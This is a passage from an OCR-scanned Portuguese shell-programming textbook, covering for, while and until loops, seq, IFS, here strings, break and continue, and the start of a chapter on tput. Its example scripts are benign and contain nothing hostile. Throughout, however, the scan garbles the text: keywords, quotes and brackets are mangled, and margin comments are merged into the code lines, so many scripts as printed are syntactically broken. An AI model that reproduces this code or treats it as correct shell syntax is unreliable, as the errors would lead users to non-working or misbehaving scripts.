RegUser= · g r ep " A$1 : " /et.c/passwd ' 
11 
f 
echo "ERRO: Não existe usu.!lr io ($1 ) , cadastrado ! ! ! " 
e >:it 3 
} 
202 
111atcna com d r bS utor <t 
De Lupa no Loop 
203 
Repare que dessa forma será atribuído valor à variável $Reguser, caso o 
12 parâmetro { $1 ) seja encontrado no início de um registro de letclpasswd, 
caso contrário, o bloco de comandos será executado, dando uma mensa-
gem de erro e abortando a execução do programa. 
Um bloco de programas também pode ser aberto por um do, por um if, 
por um e l se ou por um case e fechado por um done , um e l s e , um fi , ou 
por um esac . 
O forró do for 
Se em português disséssemos: 
pa ~a v<>r em Vdlor, vdlor, ... 
f aça 
<comando,> 
<c onli!ndo .> 
< 
< ... > 
<comando"> 
fe i t:o 
v a lo~· 
" 
Entenderíamos que a variável var assumiria os valores val or,, valor: , 
. . . , val o r" durante as n execuções dos comandos comando 1, 
comando~ , 
... , 
comando •. Pois é, meu amigo, a sintaxe original do comando for 
comporta-se exatamente da mesma maneira. Assim, vertendo-se para 
o inglês, fica: 
for vsr in vsl or , vsl or . 
do 
dane 
<comando,> 
<contando,> 
< . .. > 
<comando .> 
• 
valor n 
Que funciona da maneira descrita antes. 
Vejamos alguns exemplos do uso do comando f o r: 
Exemplo: 
Material com direitos autorais 
204 
Programação SheU Linux 
Para escrever os múltiplos de 11 a partir de 11 até 99 basta: 
S ca.t b r onze 
11 
~ 
Lista mult.1plos d e o n :ze a partir de ll ate 99 
il 
for i i n 1 2 3 4 5 6 7 8 9 
do 
echo 
$i$i 
done 
S bronze 
ll 
22 
33 
q4 
55 
66 
77 
88 
99 
Tudo o que eu disse até aqui, juro que é verdade, porém sob o ambiente 
Bash, e somente no Bash, existe um comando que gera uma sequência 
numérica e sua sintaxe é: 
seq ul timo 
seq primei~o ultimo 
seq primeiro incremento ultimo 
No primeiro caso, seria gerada uma sequência numérica de todos os 
reais começando em 1 e terminando ·em ultimo . 
No segundo tipo de sintaxe o comando geraria todos os reais a partir de 
primeiro e terminando em ultimo . 
Finalmente, no terceiro caso, a sequência de reais gerada também co-
meçaria em primeiro e terminaria em ultimo, porém os reais viriam es-
paçados de 1.ncr:emento . Assim: 
$ seq - s " " 10 
1 2 3 4 5 6 7 s 9 10 
$ s eq - s .. .. 10 15 
10 11 12 13 14 15 
$ seq - s .. .. 5 2 15 
5 7 9 ll 13 15 
1\latcna com d r bS utor <t 
De Lupa no Loop 
205 
Nesses comandos usei a opção - s " " para que o separador entre os 
números gerados fossem um espaço em branco, já que o default, que é 
line-feed, tomaria muito espaço. 
Hi, acho que esse cara tá maluco! Ele estava falando no comando 
f or e de repente começa a falar de seq, será que pirou? 
Não, amigo, dei uma interrompida na sequência (sem trocadilhos 
com seq ) do assunto para mostrar que no Bash, somente no Bash 
volto a frisar, pode-se implementar um fo r diferente. Veja só: 
Exemplos: 
$ cat bronze 
# 
# 
Lista mul tiplos de onz e a p artir de 11 ate 99 
# 
Versao usando o c omand o s e q 
# 
for J. rn ' seq 9 ' 
do 
echo 
$ i $i 
done 
$ bronze 
1 1 
22 
33 
44 
55 
66 
77 
88 
99 
Lembre-se, isso que você acabou de ver só pode ser usado no Bash. 
Agora vamos voltar à vaca fria, restaurando a ordem natural da matéria e 
conhecendo melhor o comando to :c . 
Nesta série de exemplos, veremos uma grande quantidade de formas 
diferentes de executar a mesma tarefa: 
$ l s param* 
para ml 
param2 
pa r a rn3 
par am4 
param5 
$ f or i in paraml par am2 par am3 p aram4 paramS 
> do 
Material com direitos autorais 
206 Programação SheU Linux 
> 
ls Si 
> done 
paraml 
param2 
param3 
param4 
paramS 
$ tor i in param[l-5) 
> do 
> 
ls $i 
> done 
paraml 
param2 
param3 
param4 
paramS 
$ for i in ' echo param• · 
> do 
> 
ls $i 
> done 
param! 
p;u:arn2 
param3 
param4 
paramS 
Fizemos i=pa!llm e variamos seu final de f a 5 
O echo gera nome dos arq. separados por branco 
Repare que os comandos que envolvem blocos de instruções, quando 
são diretamente digitados via terminal, só terminam quando o She/1 vê o 
fechamento destes blocos, mandando um prompt secundário(>) para cada 
nova linha. 
No programa a seguir, que é uma continuação dos exemplos do Capítulo 
3, seção Recebendo e Passando Parâmetros, devemos notar que: 
Na linha do for não existe o in. Neste caso, a variável do for tomará 
o valor dos parâmetros passados. 
Na discussão sobre passagem de parâmetros (seção Passando e 
Recebendo Parâmetros, Capítulo 3), falamos que só usando alguns 
artifícios conseguiríamos recuperar parâmetros de ordem superior a 
9. Pois bem, o for é o mais importante desses processos. Repare 
que no exemplo seguinte os onze parâmetros serão listados. 
1\latcna com d r bS utor <t 
$ cat param6 
echo O programa $0 Recebeu $# Parametros 
ec ho - n '' Que s a o : '' 
for i 
do 
echo -n "$i " 
done 
De Lupa no Loop 
207 
A opção -n contínua listagem na mesma linha 
for sem ín. Variável (i) assume valores elos parm .. 
$ param6 1. 2 . 3. 4 . 5 . 6. 7 . 8 . 9. 10. 11 . 
O programa par am6 Recebeu 11 Parametros 
Q;te sao : 1. 2. 3 . 4 . 5 . 6 . '1 . 8 . 9 . 10 . 11. $ 
Oprompt(S)apóso11éclevido aoú#imo\c 
O exemplo a seguir é particularmente útil quando você faz um download 
do Windows (com perdão da má palavra) para o LINUX e recebe um monte 
de arquivos com nomes em letras maiúsculas. Para passar estes nomes 
para minúsculas pode-se fazer um script como este: 
$ cat minuscul a .sh 
for Naiusc i n 
k 
do 
Ni nusc=$ (echo $Maiusc l tr Jl,-'Z, a -z} 
O asterisco lista o nome de todos os arquivos 
mv $Naiusc $Minusc 2> / dev/n.u l l 
I I ech o $Ninusc nao .renomeado 
done 
No script apresentado, o asterisco ( •) do fo r lista o nome de todos os 
arquivos do diretório corrente (com ou sem maiúsculas), passando-os para 
um t r que transformará, se for o caso, as letras maiúsculas em minúscu-
las. Caso o nome já estivesse em minúsculas, ou caso existisse um arquivo 
anterior com o mesmo nome em letras minúsculas, o erro proveniente do 
mv seria desviado para / ctev/null e em seguida mandaria a mensagem 
que o arquivo não fora renomeado. 
Para o exemplo seguinte, que simula uma lixeira, servem as observa-
ções anteriores sobre a ausência do i n (já que os nomes dos arquivos são 
passados como parâmetros) e sobre a quantidade de parâmetros superior 
a nove. Leia atentamente este exemplo; é muito útil. Para ser utilizado, se-
ria de bom alvitre implantar no seu bash_profile13 uma rotina de remoção 
dos arquivos por ele gerados, com data de criação inferior a um período 
previamente estipulado (sugiro quatro dias) e, no mesmo .bash_profile, po-
13. bash_profile no LINUX, no UNIX é .profile. 
Material com direitos autorais 
208 Programação SheU Linux 
de-se colocar também uma linha: alias tm"'et:reeme para executá-lo quan-
do fosse chamado o comando rm . 
$ cat erreomo 
11 !/bin/bash 
# 
@ Sal vando copia de Arqu ivo Antes de Remove- lo 
@ 
if 
[ $i! - eq O ] 
then 
Deve ler um ou maís llfquivos paro remover 
echo "Erro - > Uso; $0 arq (arql 
[arq]" 
echo " 
O uso de metacaracteres e 
permitido. Ex. erreeme arq•" 
exit 1 
li 
NeuDir•" /tmp/$LOG ~IJ\MB" 
i f 
[ ! - d $MeuDir ] 
t hen 
mkdir $!1euDir 
fi 
if [ ! -w $Meu0ir I 
t:hen 
Vllfi~veJ do sist. Contém o nome do usu6rio. 
Se não existir o meu diretório sob oltmp .•. 
Vou crlé-lo 
Se não posso gravar no díretbrlo ... 
echo Impossivel salvar arquivos ern $MeuDir . Hude permissao e tente 
novamente ... 
exit 2 
fi 
erro= O 
for Arq 
do 
if 
[ ! -f $Arq I 
then 
li 
echo $ALq nao existe. 
Erro=3 
con:: inue 
Di rOrige ' dirname $Arq ' 
if 
[ ! -w $DirOrig I 
then 
VeriAvel para lndlcer o cód. de telomo do prg 
Se esle llfquívo mio existir. .. 
Volta para o comll11do for 
Cmd. di mame /nfotme nome do dir de SArq 
Veri~B permissão de gravação no direlório 
echo Sem permissao de remover no diretorio de $krq 
Brro•4 
continue 
t ' ,, 
if [ "$DirOr i g" = " $Neu Dir" ] 
t:hen 
Vohe pera o comendo for 
Se estou ·esvaziando a tinira~ .. 
1\latcna com d r bS utor<t 
De Lupa no Loop 
209 
echo $Arq ficara sem cop1.a de seguranca 
rm - i $Arq 
Pergunto se deseja remover 
[ -f $l'.rq ] Jl echo $Arq removido Seráqueousuário aceitouaremoçíío? 
continue 
clone 
fi 
cd $Di r Orig 
echo - e " \n ' p~rd ' " >> $A.rq 
mv $Arq $MeuDi r 
echo $Arq removi do 
exit $Erro 
Esta linha e a próxima são p81'8 uso do undele/e 
Salvo e defeto 
Passo N' do erro para o código de retomo 
Bem, já que o eueeme, em vez de deletar, guardou o seu arquivo em um 
diretório debaixo de /tmp, vamos ver agora um script para recuperar o seu 
arquivo que se sente como um zumbi. 
$ cat restau ra 
# ! /bin/ba.sh 
íl 
# Res t aura a rqui vos cteletados vi a erreeme 
# 
if [ $ # - eq O ) 
t hen 
echo "Uso : $ 0 <Nome do Arquivo a Ser Restauxado>" 
exit 1 
fi 
Di r= ' tail - 1 / t mp/$LOGNAME/ $1 ' 
grep - v $Dir / t mp/$LOGNAME/ $1>$Di.r/ $1 
rm / tmp/ $LOGNF~/ $ 1 
Pega únima linha do erq. {que contém o dir original) 
Grep -v exclui ú«ima linha. Salda com nome original 
Remove arquivo que estava moribundo 
Mudando de assunto: existe uma variável intrínseca ao sistema chamada de 
r Fs (Inter Field Separator- Separador entre os campos) que, como o nome diz, 
trata-se do separador default entre dois campos. Assume-se que este default 
seja espaço, uma vez que é assim que ele se comporta. Senão vejamos: 
$ echo 
11 $IFS" 
$ e cho "$IFS" I od - h " 
0000000 0920 OaOa 
000000 4 
Nada aparece quando listamos a variável 
od ·h lista conteúdo da variável em he>!adecimal 
14. O IFS sob o ksh tem um comportamento ligeiramente diierente do visto acima, jà que sua com-
posição é < ESPAÇO>+<TAB>+<LINE F·EED>, e não < TP.l3>+<ESPAÇO>+<LI NE FEED>. 
Material com direitos autorais 
210 Programação SheU Linux 
No entanto, quando passamos o conteúdo da variável para o comando 
od com a opção - h (que gera a listagem em hexadecimal) vemos que é 
composto por três bytes que significam: 
09 -
<TAB> 
20 -
Espaço 
Oa -
Lin"' f eed 
O último oa foi produzido pela tecla <ENTER> no fim da linha (após o 
od). Veja adiante a sequência de instruções dadas diretamente a partir do 
teclado: 
$ grep f ornando I e tc/p a s swd 
Procuro o usuârio femando em letclpesswd 
femando: x: 110: 1002: Femando Guimaraes : /dsv/usr/femando : /usrlbin/l<sh 
$ OldiFS=$IFS 
Salvo o /F$ antigo 
$ I FS•: 
$ l inha='gr ep fernando / etc/passwd· 
$ echo $linha 
O novo /F$ passe a ser dois pontos (:) 
Salvo na variável linha o registro do F em ando 
Repare que não aparece mais o dois pontos(:) 
femando Y. 110 1002 Fernando Guimaraes /d:w/usr/fernando / u.sr/bin/k.sh 
$ for t asco in ·gr ep f ernando / e tc/passwd· 
> do 
> 
ocho $ t asco 
> dono 
fernando 
X 
110 
1002 
Fernando Guirnaraes 
/d.sv/usr/fernando 
/u.sr/bin/ksh 
Aqui o espaço niio separou o campo 
$ lFS•$0l d i FS 
Tudo como dantes no quartel de Abrantes 
No exercício anterior, notamos que o registro cujo separador é dois pontos 
<: l , após a alteração do Irs , foi gerado na variável linha sem que o mes-
mo aparecesse, apesar de ainda constar do seu conteúdo como pode ser 
demonstrado pelo fato da cadeia Fernando Guimarae3 permanecer unida. 
Quando for alterar o conteúdo da variável I rs a partir do prompt 
do Shell, não se esqueça de salvá-la antes, uma vez que só 
há duas formas de restaurar seu conteúdo original: salvá-lo e 
recuperá-lo ou desconectar-se e conectar-se novamente. 
1\latcna com d r bS utor <t 
De Lupa no Loop 
211 
Já que eu falei no rFs, deixa eu pegar uma carona e mostrar um belo 
macete: suponha que você tem uma variável chamada Frutas que tem o 
seguinte conteúdo: 
$ echo $Frutas 
Pêr a ~uva ~r~açã 
Para separar rapidamente os campos sem o uso do cut ou de qualquer 
outro artifício, basta fazer: 
$ 
IFS=~ 
$ set -
$Frutas 
$ echo $1 
Pera 
$ echo $2 
Uva 
$ echo $3 
~laçA 
Como pudemos ver, quando se usa o s e t -
$ Fr utas , os parâmetros po-
sicionais recebem os campos da variável Frutas, separados pelo rrs, as-
sumindo cada um o seu lugar correspondente à sua colocação na variável. 
Ou ainda: 
$ set $(echo 10 . 11 . 12 . 1 3 I tr
.
' 
' ) 
echo $2A$4 
11~13 
Lá no início, quando falávamos sobre redirecionamento, explicamos o 
funcionamento do here documents (definido pelo símbolo « , lembra?), po-
rém não abordamos uma variante muito interessante, porque ainda não tí-
nhamos embasamento de She/1 para entender. Trata-se do here strings, que 
é caracterizado por três sinais de menor <«<l . Sua sintaxe é a seguinte: 
cmd <<< pal avra 
Onde palavra é expandida e supre a entrada do comando cmct. Veja-
mos uma aplicação prática disso usando como exemplo o script abaixo. 
$ cat HereStrings 
# !/bín/ bash 
read Var l Var2 Var 3 <<< " $@ " 
echo Varl = $Varl 
echo Var2 = $Var2 
echo Va r 3 = $Var3 
Material com direitos autorais 
212 Programação SheU Linux 
Observe a execução da "criança", passando Pera, Uva e Maçã como 
parâmetros: 
$ HoroStri ngs Pora Uva Maçã 
varl : Pera 
var2 : uva 
Var3 : Haç:il 
Obs.: O comando read usado no exemplo anterior. lê dados da entrada es-
colhida para variáveis definidas. No próximo capitulo você terá uma 
explicação completa sobre esta instrução. 
Perguntaram ao mineiro: o que é while? while é 
while, uai! 
Creio ser o ~.·hile o comando de loop mais usado em programação Shell, 
portanto, o mais importante deste capítulo. Se fôssemos escrevê-lo em 
português sua sintaxe seria mais ou menos assim: 
enquanto <corodndo> 
laça 
<com.i ndo ,> 
<co~re ndo.> 
• 
< . .. > 
Onde comando é executado, e seu código de retorno é testado, caso seja 
igual a zero, só então comando,, comando_ , ... comando (o bloco de coman-
• 
• 
n 
dos entre o faça e o feito ) são executados (até aqui está igualzinho ao 
comando if) e ao encontrar o feito, reinicia-se todo o ciclo. Isso continua 
até que coma ndo devolva um código de retorno diferente de zero, quando, 
então, a execução do programa salta para a instrução que segue o feito . 
Mostrando agora a sintaxe desse comando em She/1, como manda o 
figurino e aproveitando as definições anteriores: 
while <comando> 
d o 
<conlindo,> 
<conlindo > 
< . .. > 
1\latcna com d r bS utor <t 
De Lupa no Loop 
213 
Um exemplo fala melhor que mil palavras: 
Exemplo: 
Vamos refazer o programa bronze usando o comando Hhile no lugar do 
f o :r:: 
$ cat bronze 
# 
# 
Lista multipl os de 11 a partir de 11 ate 99 - Versao 2 
# 
i=l 
"'hile [ $i - le g. ] 
do 
don e 
echo 
$i$i 
i= ' exp:r $i+ 1 ' 
$ bronze 
11 
22 
33 
44 
55 
66 
77 
88 
99 
Repare que à frente do whíle temos um test 
Agora cabe a você estipular o melhor processo para desenvolver o 
br onze. Eu, certamente, o faria usando o 1-.rhile . 
O Ciro é meu vizinho e trabalha em uma sala distante da minha. Se eu 
soubesse o momento em que ele se desconecta do UNIX, ligaria para ele 
lembrando a minha carona. Para isso, eu faço assim: 
\<hi.le who I grep ciro > / dev/ nu.ll 
do 
sleep 30 
done 
Já sabemos que devemos desprezar a salda do grep 
Espera 30 segundos fazendo absolutamente nada 
echo "O Ciro DEU EXIT . NAO HESITE, ligue logo para ele . " 
Enquanto o Ciro estiver "legado", o ''pipeline" who 1 g rep ciro gerará 
código de retorno igual a zero levando o programa a dormir por trinta se-
gundos. Assim que o Ciro se desconectar, na próxima vez que a condição 
Material com direitos autorais 
214 Programação SheU Linux 
for analisada, resultará um código de retorno diferente de zero, de forma 
que o fluxo de execução saia do loop, gerando a mensagem de alerta. 
Obviamente esse programa bloquearia o terminal, não permitindo exe-
cutar mais nada até que o Ciro se desconectasse. Se quiséssemos liberar 
o terminal, deverlamos executar o programa em background, o que se faz 
colocando um & imediatamente após o seu nome, quando se comanda a 
sua execução. Supondo que o nome desse programa seja cirobye, deverí-
amos fazer: 
$ c i robye & 
·stsrlei' o programa em background 
2469 
Shel/ devolveu PIO 
s 
Recebi o prompt para continuar trabalhando 
O until não leva um - mas é útil 
Se plantarmos uma bananeira vendo o mundo de cabeça para baixo (ou de 
ponta cabeça, como preferem os paulistas), quando olharmos para o while 
estaremos vendo o unr.il. Entendeu? Nem eu. 
O blablablá foi para mostrar que o until é igual ao while, porém ao 
contrário. Se este fosse um livro de física, diríamos com a mesma direção 
e sentidos opostos. 
Como já fizemos em diversas oportunidades, vejamos qual seria a sua 
sintaxe se o She/1 entendesse português: 
acé que <comando> 
faça 
<con"' ndo ,> 
<comando.> 
. 
< .. o> 
<comando,,> 
!e i to 
onde comando é executado e seu código de retorno é testado, caso não 
seja igual a zero, comando •. comando •. ... comando,. (os comandos entre 
o faça e o feito} são executados (até aqui está idêntico ao else do 
comando if) e ao encontrar o feito, reinicia-se todo o ciclo. Isso conti-
nua até o comando devolver um código de retorno igual a zero, quando a 
execução do programa salta para a instrução que segue o feito . 
1\latcna com d r bS utor <t 
De Lupa no Loop 
215 
O formato geral desta sintaxe em Shell é o seguinte: 
until <col1ldndo> 
do 
done 
<comando,> 
<comando0> 
< . . . > 
<comando > 
r. 
O comando until é particularmente útil quando o nosso programa ne-
cessita esperar que um determinado evento ocorra. 
Exemplo 
Para provarmos que o until é o ,,hile ao contrário, vejamos um exem-
plo que seja o inverso do anterior: vamos fazer um programa que nos avise 
quando uma determinada pessoa se conectou. Ainda ao contrário, esta 
pessoa não é o Ciro, mas sim a Bárbara, (que, como diz o nome, é real-
mente bárbara ... ). Eu já havia feito o programa t alogado (descrito anterior-
mente) que eu poderia usar para saber quando a Bárbara se conectasse. 
O talogado era assim: 
$ cat talogado 
# 
# 
Verifica s e dete .rmi n ado usuario es t a "logado" -
versao 2 
# 
if \-rho I g r ep $1 > /dev / null 
t hen 
echo $1 esta l egado 
else 
echo $1 nao esta l egado 
fi 
Ora, para saber se a Bárbara já havia se conectado eu tinha de fazer: 
$ tal ogado barbara 
bar bara nao esta l ogado 
E até que ela se conectasse eu tinha de executar esse comando diver-
sas vezes (já que minha ansiedade me obrigava a executar o programa a 
cada minuto). Resolvi então desenvolver um programa específico para es-
ses deliciosos momentos matinais, que chamei de bctb (Bom Dia Bárbara 
em código). 
Material com direitos autorais 
216 Programação SheU Linux 
$ cat bdb 
i !/bin/bl!sh 
!I 
i 
Avi so que dete:minnda u3 uar~a 3e conect ou 
v 
i f 
[ " $H " - ne 1 ] 
t.hen 
li 
echo ''Erro -> Uso : SO usuario'' 
exit: l 
unt il who 
q rep $1 > /dev/null 
do 
s l eep 30 
done 
echo $1 se l ogou 
O unlil está testando o retomo do comando grep 
Essa forma está quase boa, mas o programa iria prender a tela do meu 
terminal até que a pessoa ansiosamente aguardada se conectasse. 
Ora, isso é muito fácil! Basta executar o programa em background. E 
foi o que fiz, até que um dia estava no vi editando um script quando ela 
se legou e a mensagem vindo das profundezas do background estragou a 
minha edição. Outra vez foi pior ainda, estava listando na tela um arquivo 
grande, a mensagem do programa saiu no meio deste cat e com o scro/1 da 
tela eu não vi e não telefonei para dar-lhe bom dia. 
A partir de então, resolvi reescrever o programa dando uma opção de 
mandar o aviso para onde escolhesse: direto para a tela ou para o meu 
mail, isto é, se na execução do programa fosse passado o parâmetro -m, o 
resultado iria para o mail, caso contrário, para a tela. 
Veja só o que fiz: 
$ cat bdb 
1! !/bin/bash 
• 
il 
Avi s.1 que determinada usuaria se conectou - vers .1o 2 
~ 
NandaMa i l~ 
if 
[ "$1" a -m ] 
then 
!1andaHail= l 
shift 
lnicializs varl8ve/ vszis 
A seguir verifico ss foi passado o p818metro -m 
Jll sinalizei com /AandaMaiL Jogo tom o ·m 
Copyr ht 
fi 
i f 
[ "$#'' -ne 1 ] 
t hen 
fi 
echo "Erro -> Uso : $0 [- m] usuario" 
echo "Usa- se - m para avi sar vi a ma il" 
exit l 
until '"ho 
do 
grep $ 1 > /dev/null 
s l eep 30 
done 
if 
[ '' $MandaMa i l'' ] 
t hen 
ec ho '' $1 se l ogou '' I mail julio 
el se 
echo " $1 se l ogou" 
fi 
De Lupa no Loop 
217 
Vamos veriffcar se recebi o nome do usuário 
Atê que seu nome apareça no comando who ... 
Aguarde 30 segundos 
Se a variavel MandaM ai/ não estiver vazia ... 
No exemplo citado, primeiro testamos se a opção - m foi usada. Se foi, 
colocamos a variável t1andaMail igual a um e fizemos um shift para jogar 
fora o primeiro argumento (movendo o nome do usuário para $ 1 e decre-
mentando $#). O programa então prossegue como na versão anterior, até 
que sai do ciclo de espera, quando faz um teste para verificar se a opção 
- m foi utilizada. 
$ bdb barbara - m 
Erro -> Uso : bdb [-m] 
us uar~ o 
- m par a ma nda.r: aviso vi a 
$ bdb - m barbara & 
[1 ] 
28808 
you have mai l 
mai l 
Mandei executar em background 
Recebi o PID do programa 
Continuo o meu trabalho ... 
Sistema me avisa que chegou um mail 
O programa anterior está genérico quanto ao usuário que esperamos 
conectar-se pois, sempre o passamos por parâmetro, porém, só eu posso 
usá-lo, porque o mail será endereçado para mim. Se quisermos que o mail 
seja enviado para qualquer pessoa que esteja executando o programa, 
devemos fazer: 
$ c at bdb 
#!/ bin/ bash 
# 
# 
Jl.~vis a q u e dete r mi n a d a usuaria se cone c t o u -
v e r sao 3 
# 
Material com direitos autorais 
218 Programação SheU Linux 
l·tandaMai l D 
if 
[ " $1" • -m ] 
t:hen 
Eu• · '-"'h o tun. i 
c ut - fl - d" .. " 
1-landaMail=l 
shift 
fi 
if 
[ "SI" -rle 1 I 
then 
echo "Erro -> Uso : $0 f -m] u:suario" 
echo "Usa-se - m para avisar via m.ail t! 
exit 1 
fi 
until who 
gxep Sl > /dev/null 
do 
s l eep 30 
done 
if [ "$MandaMail" ) 
~:hen 
echo "$1 se logou" I mail $Eu 
el se 
echo " $1 se l ogou• 
fi 
Varilrvel Eu recebe nome do usuário ativo 
Mal vai para quem está executando prg. 
A linguagem de programação do She/1 é muito rica e cheia de recursos, 
isso por vezes faz com que um programa que idealizamos, após um pouco 
de reflexão, torne-se um elefante branco. Poderíamos ter obtido o mesmo 
resultado de antes, sem fazer todas essas alterações se executássemos o 
programa, em sua primeira versão, assim: 
$ bdb barbara I mail <nome destinatário> & 
[1] 
28808 
Continue dançando o break 
Nem sempre um ciclo de programa, compreendido entre um do e um ctone, 
sai pela porta da frente. Em algumas oportunidades, temos que colocar um 
comando que aborte de forma controlada este /oop. De maneira inversa, al-
gumas vezes desejamos que o fluxo de execução do programa volte antes 
de chegar ao ctone. Para isso, temos respectivamente os comandos break 
e continue (que já vimos rapidamente nos exemplos do comado for) e 
funcionam da seguinte forma: 
Copyr ht 
De Lupa no Loop 
219 
break 
continue 
' 
Uso do comando br eak 
Uso do comandoconti nue 
O que eu não havia dito anteriormente é que nas suas sintaxes genéri-
cas eles aparecem da seguinte forma: 
break [qtd loop] 
e 
con t i nue [qtd l oop] 
Onde qtd l oop representa a quantidade dos loops mais internos sobre 
os quais os comandos irão atuar. Seu valor defauff é 1. 
Exemplo: 
Vamos fazer um programa que liste os números múltiplos de dois, a par-
tir de zero até um valor informado pelo teclado. 
$ cat 2ehbom 
Com:a=l 
whil e [ "$Cont.a" - le "$1
11 
] 
d o 
Resto= ' expr $Conta
~ z· 
if 
[ "$Res t o " - e q 1 ] 
then 
Conta= ' expr $Conta + 1' 
c ont i nue 
fi 
echo $Conta eh multiplo de 
Conta= ' expr $Conta + 1 ' 
done 
$ 2ehbom 
$ 2ehbom 1 
$ 2ehbom 9 
2 e h mul tipl o de dois . 
4 e h n\ul t iplo de dois . 
Se resto da divisão por 2 for= 1. Não é múffiplo 
Voffa ao comando do sem executar fim do loop 
<iois. 
Material com direitos autorais 
220 Programação SheU Linux 
6 eh multiplo de dois . 
8 eh mult iplo de dois . 
Para dar um exemplo mais genérico, poderíamos alterar o programa 
2ehbom para ficar com o seguinte formato: 
$ cat 2ehbom 
Col1t a=O 
while true 
do 
Ê llSSim que se faz um loop perpêtuo 
Done 
Conta• ' expr $Cont a+ 1 ' 
if 
[ "$Conta" -gt "$1 " I 
t:hen 
breal: 
fi 
Resto= ' expr $Conta ~ 2 ' 
if 
[ "$Re,to" - eq 1 I 
then 
continue 
li 
echo $Conta eh multiplo de dois . 
Se o contador for> limffe superior informado 
Bye,byetoop 
Se não for múltiplo de 2 vofta oo Inicio do loop 
Exercício 
1. Imagine uma empresa com escritórios estaduais espalhados pelo Bra-
sil e um arquivo chamadoArqOLs que tem cadastrados os operadores 
de todos os escritórios estaduais, responsáveis pela leitura de todos os 
e-mails recebidos e pela tomada da atitude solicitada por cada e-
mail. Este arquivo tem o layout a seguir: 
<N° OL><TAB><Nome da ~!6quina do E.~crit6do><TAB><Ope.r .> <Oper> ... <Oper > 
.. 
• 
l i 
Fazer um programa que mande um e-mail para todos os operadores 
de um determinado escritório (recebendo <N° OL> ou <Nome da Má-
quina do Escritório> como parâmetro) com o conteúdo de um arquivo 
(nome recebido como 2!! parâmetro). 
Obs.: Não se esqueça de que o comando para passar e-mail tem o 
seguinte formato: 
mail operador@máquin a < arquivo 
~ 
- ~? -
Copyr ht 
1 ·f ,~~ l Capítulo 6 
. 
. 
. . 
i Já sabemos um pouquinho sobre programação Shell. 
Estamos como naquele ditado popular: "Em terra de 
olho, quem tem um cego, ih!! Errei!". A partir deste 
capítulo começaremos a nos soltar (com todo respei-
to) na programação She/1, já que poderemos montar 
rotinas com muita utilização e pouca embromação, e 
aprenderemos a receber dados oriundos do teclado ou 
de arquivos. 
Que posição você prefere? 
Nesta seção aprenderemos, principalmente, a posicionar 
o cursor, além de outras facilidades, para quando necessi-
tarmos receber os dados via teclado, possamos formatar 
a tela visando melhorar a apresentação e o entendimento 
do que está sendo pedido. 
Neste ponto, já devemos saber que existe a instrução 
clear, cuja finalidade é limpar a tela e que deve ser o 
ponto inicial de qualquer rotina de recepção de dados 
via teclado. 
Para formatação de tela, além do c l ea r existe uma ins-
trução multifacetada de uso geral, que é o t put . Veremos a 
seguir as principais faces dessa instrução: 
221 
Material com direitos autorais 
222 
Programação SheU Linux 
t put cup (cup ~ cursor posi t ion J -Cuja finalidade é posicionar o 
cursor na tela e cuja sintaxe é a seguinte: 
tput cup l i n col 
Onde hn é a linha e col a coluna onde se deseja posicionar o cursor. É 
interessante e importante assinalar que a numeração das linhas e das colu-
nas começa em zero. 
tput bold -
Coloca o terminal no modo de ênfase, chamando a 
atenção sobre o que aparecerá na tela a partir daquele ponto até a 
sequência de restauração de tela. 
tput. smso - Coloca o terminal no modo de vídeo reverso, a partir 
daquele ponto até a sequência de restauração de tela. 
-
tput rev -Idêntico ao tput smso . 
tput. smul - Todos os caracteres, a partir daquele ponto até a instru-
ção para restauração de tela, aparecerão sublinhados na tela. 
-
tput blink - Coloca o terminal em modo piscante, a partir daquele 
ponto até a sequência de restauração de tela (nem todos os terminfo 
aceitam essa opção). 
tput. sgro - Restaura o modo normal do terminal. Deve ser usado após 
um dos três comandos anteriores, para restaurar os atributos de vídeo. 
tpu~:. reset - Restaura todos os parâmetros do seu terminal voltando 
suas definições ao defauft do terminfo- que está definido na variável 
do sistema $TER!~ -
e dá um clear no terminal. Sempre que possível 
deve ser usado no final da execução de programas que utilizam a 
instrução tput . 
tput. lines - Devolve a quantidade de linhas do monitor corrente, 
terminal corrente ou console (se esta for o monitor corrente). 
t:put cols - Devolve a quantidade de colunas do monitor corrente, 
terminal corrente ou console (se esta for o monitor corrente). 
-
tput. ed <ect - erase àisplayJ -Limpa a tela a partir da posição do 
cursor até o fim do monitor corrente, terminal corrente ou console (se 
esta for o monitor corrente). 
tput el <el -
e rase linel -Limpa a partir da posição do cursor até 
o fim da linha. 
tput. il n ( il -
J.nse r t lines) - insere n linhas a partir da posição 
do cursor. 
Copyr ht 
Aprendendo a ler 
223 
t pu t d l n (dl ~ del ete lines l - deleta n linhas a partir da posição 
do cursor. 
tput dch n (dch ~ de l ete characters ) - deleta n caracteres a partir 
da posição do cursor. 
tput 
civis -
Torna o cursor invisível (produz o mesmo efeito de 
set ter m - c ursor off ). 
tput c norm- Volta a mostrar o cursor (produz o mesmo efeito de 
setterm -curs o r on). 
t put flash -
Dá uma claridade intensa e rápida (flash) na tela para 
chamar a atenção. 
tput se (se -
save c ursor posi t ion) -Guarda a posição atual do 
cursor. 
t put rc (rc -
Res t ore cursor t o positi on) - Retornao cursor para 
a última posição guardada pelo s e . 
stty -
Este comando tem uma série imensa de opções de pouco 
uso, porém muito fortes, podendo inclusive alterar as definições do 
terminfo. Vale a pena, por ser muito usada, esmiuçarmos a opção 
echo, que serve para inibir ou restaurar o eco das teclas no terminal, 
isto é, caso o seu script possua um comando s tty - echo, tudo que 
for teclado daquele ponto até a ocorrência do comando stty echo , 
não aparecerá no terminal de vídeo. É de suma importância parare-
cebermos uma senha pela tela. 
Com esse comando também se pode colorir a tela. Mais adiante, no ca-
pítulo 8, seção "Mandando no Terminal", você verá outras formas de fazer a 
mesma coisa; acho, porém, esta que veremos agora, mais intuitiva (ou me-
nos "desintuitiva"). A tabela a seguir mostra os comandos para especificar-
mos os padrões de cores de frente (foreground) ou de fundo (background): 
.Obtendo cores com o comando.tput • 
-
-
' . 
-
. 
'· .· -
... 
' 
I 
' 
Comando 
Efeito 
tput seta f n 
Especifica n como a cor de frente (foreground} 
tput setab n 
Especifica n como a cor de fundo (background} 
Matenal çorn d1re1tos at,tora1s 
224 Programação Shell Linux 
Bem, agora você já sabe como especificar o par de cores, mas ainda 
não sabe as cores. A tabela a seguir mostra os valores que o n {da tabela 
anterior) deve assumir para cada cor: 
Valor 
Cor 
o 
Preto 
1 
Vermelho 
2 
Verde 
3 
Marrom 
4 
Azul 
5 
Púrpura 
6 
Ciano 
7 
Cinza claro 
Neste ponto você já pode começar a brincar com as cores. Mas perai, 
ainda são muito poucas! É, tem toda razão ... O problema é que ainda não te 
